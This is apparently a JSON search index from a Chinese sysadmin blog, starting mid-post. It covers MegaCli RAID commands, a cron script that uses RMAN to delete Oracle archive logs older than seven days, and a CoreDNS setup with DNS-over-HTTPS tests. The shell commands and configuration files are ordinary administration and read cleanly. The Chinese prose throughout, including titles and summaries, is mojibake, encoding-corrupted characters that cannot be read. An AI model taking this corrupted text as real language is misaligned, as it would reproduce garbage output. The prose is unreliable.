class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#downgrade raid6 --\u0026gt; raid5 ,and more space now can be used\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# -L0  virtual disk 0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# /opt/MegaRAID/MegaCli/MegaCli64 -LDRecon -Start -r5 -L0 -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# echo 1 \u0026gt; /sys/block/sda/device/rescan\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Add disk to a raid5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -LDRecon -Start -r5 -Add -PhysDrv[32:3] -L0 -a\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Configure WriteThrough or WriteBack\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -LDSetProp -WT -Immediate -Lall -aAll\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -LDSetProp -WB -Immediate -Lall -aAll\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -PDList -aALL |grep \u0026#34;Inquiry Data:\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Inquiry Data: SEAGATE ST600MP0005     VS08S7M04B0C            \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Inquiry Data: SEAGATE ST600MP0005     VS08S7M04AFD            \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Inquiry Data: SEAGATE ST600MP0005     VS08S7M04JAY            \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Inquiry Data: SEAGATE ST600MP0005     VS08S7M04AAG            \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -PDList -aALL  | grep \u0026#34;Drive Temperature\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Drive Temperature :36C (96.80 F)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Drive Temperature :35C (95.00 F)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Megacliæ“ä½œç£ç›˜çš„å¸¸ç”¨å‘½ä»¤"},{"content":"è¿™ä¸€ç¯‡æ­£è§„çš„DBAçœ‹åˆ°è‚¯å®šä¼šå‘²ä¹‹ä»¥é¼»ï¼Œä½†å¯¹äºæ²¡æœ‰ç”¨è¿‡oracleçš„ç³»ç»Ÿè¿ç»´æ¥è¯´ï¼Œå°±æ˜¯å¿…é¡»çŸ¥é“çš„äº‹æƒ…äº†ã€‚\nå…¬å¸çš„ Oracle å®ä¾‹æœ‰ä¸¤å°æ•°æ®åº“ï¼Œå®šæ—¶ç”¨rmanå¤‡ä»½ï¼Œä½†æ˜¯æ²¡æœ‰è‡ªåŠ¨æ¸…ç†æœºåˆ¶ ï¼Œè¿‡ä¸€é˜µå­ç£ç›˜å°±ä¼šè¶…è¿‡ 80% å‘Šè­¦ï¼Œéœ€è¦æ‰‹åŠ¨æ¸…ç†ï¼Œçƒ¦ä¸èƒœçƒ¦ã€‚\nå‡¡æ˜¯è¦æ‰‹åŠ¨åšä¸‰æ¬¡çš„äº‹æƒ…å¿…é¡»è‡ªåŠ¨åŒ–å¤„ç†ï¼Œå¯è£å¤§å¸ˆå¦‚æ˜¯è¯´ï¼Œç…§åŠå°±æ˜¯ã€‚\ncat del_log.sh #!/bin/bash source /home/oracle/.bash_profile rman target / \u0026lt;\u0026lt; EOF delete noprompt archivelog until time \u0026#39;sysdate-7\u0026#39;; exit; EOF å¾ˆç®€å•å§ã€‚ä¸Šé¢å¼•ç”¨çš„ .bash_profile å†…å®¹å¦‚ä¸‹ï¼š\n# .bash_profile # Get the aliases and functions if [ -f ~/.bashrc ]; then . ~/.bashrc fi # User specific environment and startup programs PATH=$PATH:$HOME/.local/bin:$HOME/bin export PATH export ORACLE_BASE=/data/u01/app/oracle export ORACLE_HOME=/data/u01/app/oracle/product/18.3.0/dbhome_1 export ORACLE_SID=oradb export PATH=/usr/sbin:$PATH export PATH=$ORACLE_HOME/bin:$PATH:/usr/local/bin export LD_LIBRARY_PATH=$ORACLE_HOME/lib:/lib:/usr/lib:$ORACLE_HOME/rdbms/lib export CLASSPATH=$ORACLE_HOME/JRE:$ORACLE_HOME/jlib:$ORACLE_HOME/rdbms/jlib export NLS_DATE_FORMAT=\u0026#39;yyyy/mm/dd hh24:mi:ss\u0026#39; export EDITOR=vi umask 022 è¿™ä¸ª del_log.sh çš„è„šæœ¬æ”¾è¿› oracle ç”¨æˆ·çš„ crontab é‡Œæ‰§è¡Œå°±å¥½\n0 3 * * * /usr/local/bin/del_log.sh ","permalink":"https://rendoumi.com/posts/20221208-oracle_rman/","summary":"\u003cp\u003eè¿™ä¸€ç¯‡æ­£è§„çš„DBAçœ‹åˆ°è‚¯å®šä¼šå‘²ä¹‹ä»¥é¼»ï¼Œä½†å¯¹äºæ²¡æœ‰ç”¨è¿‡oracleçš„ç³»ç»Ÿè¿ç»´æ¥è¯´ï¼Œå°±æ˜¯å¿…é¡»çŸ¥é“çš„äº‹æƒ…äº†ã€‚\u003c/p\u003e\n\u003cp\u003eå…¬å¸çš„ Oracle å®ä¾‹æœ‰ä¸¤å°æ•°æ®åº“ï¼Œå®šæ—¶ç”¨rmanå¤‡ä»½ï¼Œä½†æ˜¯æ²¡æœ‰è‡ªåŠ¨æ¸…ç†æœºåˆ¶ ï¼Œè¿‡ä¸€é˜µå­ç£ç›˜å°±ä¼šè¶…è¿‡ 80% å‘Šè­¦ï¼Œéœ€è¦æ‰‹åŠ¨æ¸…ç†ï¼Œçƒ¦ä¸èƒœçƒ¦ã€‚\u003c/p\u003e\n\u003cp\u003eå‡¡æ˜¯è¦æ‰‹åŠ¨åšä¸‰æ¬¡çš„äº‹æƒ…å¿…é¡»è‡ªåŠ¨åŒ–å¤„ç†ï¼Œå¯è£å¤§å¸ˆå¦‚æ˜¯è¯´ï¼Œç…§åŠå°±æ˜¯ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat del_log.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#!/bin/bash\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003esource\u003c/span\u003e /home/oracle/.bash_profile\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erman target / \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003edelete noprompt archivelog until time \u0026#39;sysdate-7\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eexit;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¾ˆç®€å•å§ã€‚ä¸Šé¢å¼•ç”¨çš„ .bash_profile å†…å®¹å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# .bash_profile\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Get the aliases and functions\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e -f ~/.bashrc \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        . ~/.bashrc\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# User specific environment and startup programs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ePATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$PATH\u003c/span\u003e:\u003cspan class=\"nv\"\u003e$HOME\u003c/span\u003e/.local/bin:\u003cspan class=\"nv\"\u003e$HOME\u003c/span\u003e/bin\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e PATH\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eORACLE_BASE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/data/u01/app/oracle\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eORACLE_HOME\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/data/u01/app/oracle/product/18.3.0/dbhome_1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eORACLE_SID\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eoradb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ePATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/usr/sbin:\u003cspan class=\"nv\"\u003e$PATH\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ePATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ORACLE_HOME\u003c/span\u003e/bin:\u003cspan class=\"nv\"\u003e$PATH\u003c/span\u003e:/usr/local/bin\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eLD_LIBRARY_PATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ORACLE_HOME\u003c/span\u003e/lib:/lib:/usr/lib:\u003cspan class=\"nv\"\u003e$ORACLE_HOME\u003c/span\u003e/rdbms/lib\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eCLASSPATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ORACLE_HOME\u003c/span\u003e/JRE:\u003cspan class=\"nv\"\u003e$ORACLE_HOME\u003c/span\u003e/jlib:\u003cspan class=\"nv\"\u003e$ORACLE_HOME\u003c/span\u003e/rdbms/jlib\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eNLS_DATE_FORMAT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;yyyy/mm/dd hh24:mi:ss\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eEDITOR\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003evi\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eumask\u003c/span\u003e \u003cspan class=\"m\"\u003e022\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™ä¸ª del_log.sh çš„è„šæœ¬æ”¾è¿› oracle ç”¨æˆ·çš„ crontab é‡Œæ‰§è¡Œå°±å¥½\u003c/p\u003e","title":"Oracleä½¿ç”¨rmanå®šæ—¶æ¸…é™¤7å¤©å‰çš„æ—¥å¿—"},{"content":"CoreDNSæ˜¯k8sçš„å¾¡ç”¨DNSè§£æè½¯ä»¶\næ”¯æŒå¾ˆå¤šæ’ä»¶ï¼Œå„ç§DoHã€DoTã€gRPC ï¼Œå„ç§ç‰¹æ€§ï¼Œå®‰è£…é…ç½®ä¹Ÿååˆ†ç®€å•\næ›¿ä»£dnsmasqåï¼ŒåŸºæœ¬dnsmasqçš„åŠŸèƒ½éƒ½æ”¯æŒï¼Œä¿®æ”¹åŠ«æŒåŸŸååä¹Ÿä¸ç”¨é‡å¯ï¼Œä¼šè‡ªåŠ¨åˆ·æ–‡ä»¶æ›´æ–°\nä¸‹é¢è¯´ä¸€ä¸‹è£…æ³•ï¼š\nå®‰è£…ï¼š\nwget https://github.com/coredns/coredns/releases/download/v1.7.0/coredns_1.7.0_linux_amd64.tgz\rè§£å‹åå°±ä¸€ä¸ªæ–‡ä»¶ï¼Œç›´æ¥æ”¾åˆ°/usr/local/bin\nåšä¸ªsystemdå¯åŠ¨æ–‡ä»¶\ncat /etc/systemd/system/coredns.service [Unit] Description=CoreDNS DNS server After=network.target [Service] PermissionsStartOnly=true LimitNOFILE=1048576 LimitNPROC=512 CapabilityBoundingSet=CAP_NET_BIND_SERVICE AmbientCapabilities=CAP_NET_BIND_SERVICE NoNewPrivileges=true ExecStart=/usr/local/bin/coredns -conf=/usr/local/bin/coredns.conf ExecReload=/bin/kill -SIGUSR1 $MAINPID Restart=on-failure [Install] WantedBy=multi-user.target ä¸œè¥¿å…¨éƒ½åœ¨/usr/local/bin/coredns.confé…ç½®æ–‡ä»¶é‡Œï¼š\n.:5353 https://.:443 { any log debug bind 172.18.30.1 tls /usr/local/bin/full.pem /usr/local/bin/key.pem hosts /etc/hosts { ttl 60 reload 1m no_reverse fallthrough } cache 120 reload 6s loadbalance forward . 114.114.114.114:53 223.5.5.5:53 223.6.6.6:53 { policy sequential } prometheus 172.18.30.1:9253 } è§£é‡Šä¸€ä¸‹ï¼š\n. è¡¨ç¤ºæ‰€æœ‰åŸŸåï¼Œ.:5353 å’Œ https://.:443 è¡¨ç¤ºå¼€äº†5353å’Œ443ç«¯å£æ¥æœåŠ¡æ‰€æœ‰åŸŸåçš„æŸ¥è¯¢ bind 172.18.30.1 ç»‘å®šæŒ‡å®šip tls full.pemå’Œkey.pemæ˜¯legoç”Ÿæˆçš„*.rendoumi.comçš„è¯ä¹¦é“¾å’Œç§é’¥ hosts è¡¨ç¤ºä»æ–‡ä»¶è§£æï¼Œreload 1mä¼šè‡ªåŠ¨æ‰«ææ–‡ä»¶å˜åŠ¨å¹¶åŠ è½½ æœ€æœ‰ç”¨çš„æ˜¯fallthrough ï¼Œå¦‚æœåœ¨/etc/hosts æ‰¾ä¸åˆ°è®°å½•ï¼Œé‚£å°±ç»§ç»­ï¼Œå»ä¸‹é¢çš„é…ç½®é‡Œæ‰¾ loadbalance è¡¨ç¤ºå¦‚æœæŸ¥åˆ°çš„è®°å½•æœ‰å¤šæ¡ï¼Œé‚£å°±æŒ‰round-robinè½®è¯¢è¿”å›ç»“æœ forward è¿™é‡ŒæŒ‡å®šä¸Šæ¸¸æœåŠ¡å™¨ï¼Œæœ€å¤šå¯ä»¥æœ‰15ä¸ªä¸Šæ¸¸ policyæ˜¯ä¸¥æ ¼æŒ‰é¡ºåºæ¥ï¼Œé¦–å…ˆ114ï¼Œ114åäº†5.5.5ï¼Œ5.5.5åäº†6.6.6ï¼Œå¦‚æœä¸æŒ‡å®šä¼šä»upstreamé‡Œéšæœº æŒ‘ä¸€ä¸ª prometheus éœ²å‡ºç«¯å£ï¼Œä¾›prometheusåˆ®æ•°æ®ç”¨ ç„¶åå¯åŠ¨ï¼Œå°±å¯ä»¥äº†ï¼Œè¿™é‡Œä¸ºäº†é¿å…è·Ÿdnsmasqå†²çªï¼Œç”¨äº†5353ï¼Œå®é™…åº”è¯¥æ˜¯53ç«¯å£\nsystemctl start coredns\ræµ‹ä¸€ä¸‹æ ‡å‡†çš„dnsæŸ¥è¯¢\ndig -t a m.ddky.com @172.18.30.1 -p5353\rä¸‹é¢æ¥è§£é‡ŠDoHï¼ŒDNS-Over-HTTPSï¼Œè¿™ä¸ªç‰¹æ€§éå¸¸é¬¼ç•œ æ³¨æ„ï¼Œå‡†ç¡®çš„è¯´httpsæäº¤çš„æ˜¯dns-message\nå…ˆæµ‹ä¸€ä¸‹CF\ncurl -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?name=m.ddky.com\u0026amp;type=A' | jq .\rjsonçš„ç»“æœå¾ˆåä¸½ï¼Œä½†æ˜¯è¯·æ³¨æ„ï¼Œä¸Šé¢å®é™…å‘çš„æ˜¯dns-jsonï¼Œcorednsä¸æ”¯æŒï¼Œé¬¼ç•œå§ï¼\nDoHå®é™…æäº¤çš„æ˜¯dns-messageï¼š\ncurl -H 'accept: application/dns-message' -v 'https://dns.ddky.com/dns-query?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB' | hexdump\rcurl -H 'accept: application/dns-message' -v 'https://cloudflare-dns.com/dns-query?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB' | hexdump\ræ³¨æ„é‚£ä¸²dns=çš„å­—ç¬¦ä¸²ï¼Œé‚£æ˜¯ä¸ªå®é™…çš„æŸ¥è¯¢ï¼Œè¢«Base64åŠ ç äº†ï¼Œä½†ç»ä¸æ˜¯å¯¹ name=www.example.com\u0026amp;type=A è¿™æ ·ç®€å•çš„base64ï¼Œè¿™ä¸ªä¸œè¥¿å®Œå…¨æ— æ³•é€ å‡ºæ¥ï¼Œæœ‰äºŒè¿›åˆ¶çš„ä¸œè¥¿åœ¨é‡Œé¢ã€‚\næ‰€ä»¥æˆ‘ä»¬å¿…é¡»ç”¨ç¨‹åºæ¥äº†ï¼Œå¿…é¡»ä¸‹è½½ä¸€ä¸ªåœŸé€ çš„DoHçš„å®¢æˆ·ç«¯\nwget https://github.com/ameshkov/dnslookup/releases/download/v1.3.0/dnslookup-linux-amd64-v1.3.0.tar.gz\rè§£å‹å‡ºæ¥ä¸€ä¸ªdnslookupï¼Œç”¨è¿™ä¸ªæ¥æŸ¥æ‰è¡Œ\n./dnslookup www.ddky.com https://dns.ddky.com/dns-query\r./dnslookup www.ddky.com https://dns.alidns.com/dns-query\rè¿™æ ·å°±okäº†ï¼Œæœ€åè¡¥å……ä¸€ä¸‹ï¼Œå¦‚æœä½ éè¦ç”¨curlåšDoHï¼Œä¹Ÿè¡Œï¼Œå¾—ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„curl\ncurl -v --doh-url https://cloudflare-dns.com/dns-query https://m.ddky.com\rçœ‹è¿‡ç¨‹ï¼Œæ˜¯å…ˆå»CFæŸ¥äº†DNSï¼Œç„¶ååˆå‘äº†ä¸ªè¯·æ±‚åˆ°m.ddky.com\n","permalink":"https://rendoumi.com/posts/20221207-cordns_dnsmasq/","summary":"\u003cp\u003eCoreDNSæ˜¯k8sçš„å¾¡ç”¨DNSè§£æè½¯ä»¶\u003c/p\u003e\n\u003cp\u003eæ”¯æŒå¾ˆå¤šæ’ä»¶ï¼Œå„ç§DoHã€DoTã€gRPC ï¼Œå„ç§ç‰¹æ€§ï¼Œå®‰è£…é…ç½®ä¹Ÿååˆ†ç®€å•\u003c/p\u003e\n\u003cp\u003eæ›¿ä»£dnsmasqåï¼ŒåŸºæœ¬dnsmasqçš„åŠŸèƒ½éƒ½æ”¯æŒï¼Œä¿®æ”¹åŠ«æŒåŸŸååä¹Ÿä¸ç”¨é‡å¯ï¼Œä¼šè‡ªåŠ¨åˆ·æ–‡ä»¶æ›´æ–°\u003c/p\u003e\n\u003cp\u003eä¸‹é¢è¯´ä¸€ä¸‹è£…æ³•ï¼š\u003c/p\u003e\n\u003cp\u003eå®‰è£…ï¼š\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003ewget https://github.com/coredns/coredns/releases/download/v1.7.0/coredns_1.7.0_linux_amd64.tgz\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eè§£å‹åå°±ä¸€ä¸ªæ–‡ä»¶ï¼Œç›´æ¥æ”¾åˆ°/usr/local/bin\u003c/p\u003e\n\u003cp\u003eåšä¸ªsystemdå¯åŠ¨æ–‡ä»¶\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/systemd/system/coredns.service \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eUnit\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eDescription\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eCoreDNS DNS server\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eAfter\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003enetwork.target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eService\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ePermissionsStartOnly\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eLimitNOFILE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1048576\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eLimitNPROC\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e512\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eCapabilityBoundingSet\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eCAP_NET_BIND_SERVICE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eAmbientCapabilities\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eCAP_NET_BIND_SERVICE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eNoNewPrivileges\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eExecStart\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/usr/local/bin/coredns -conf\u003cspan class=\"o\"\u003e=\u003c/span\u003e/usr/local/bin/coredns.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eExecReload\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/bin/kill -SIGUSR1 \u003cspan class=\"nv\"\u003e$MAINPID\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eRestart\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eon-failure\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan 